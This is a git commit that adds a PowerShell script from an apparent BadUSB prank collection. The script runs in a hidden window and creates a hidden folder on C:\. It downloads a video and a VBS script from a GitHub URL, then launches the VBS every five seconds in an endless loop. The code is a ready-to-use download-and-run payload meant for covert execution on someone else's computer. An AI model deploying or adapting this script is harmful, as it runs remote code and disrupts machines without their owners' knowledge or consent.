46e3341ae9f37f59de01c577ee1149e2742f79f0
Babyporkchop <93239527+Babyporkchop@users.noreply.github.com>
2023-01-19 11:57:40 +0800

    Add files via upload

---
+++ BadUSBScripts/RickRoll/ContinuousRickRoll/RickRoll.ps1
@@ -0,0 +1,12 @@
+﻿Powershell.exe -windowstyle hidden {
+    cd C:\
+    mkdir RickRoll
+    attrib +H RickRoll
+    cd RickRoll
+    Invoke-WebRequest -Uri https://raw.githubusercontent.com/Babyporkchop/Scripts/main/BadUSBScripts/RickRoll/RickRoll.mp4 -OutFile .\RickRoll.mp4
+    Invoke-WebRequest -Uri https://raw.githubusercontent.com/Babyporkchop/Scripts/main/BadUSBScripts/RickRoll/ContinuousRickRoll/Play.vbs -OutFile .\Play.vbs
+    while ($true) {
+        start Play.vbs
+        Start-Sleep -Seconds 5
+    }
+}
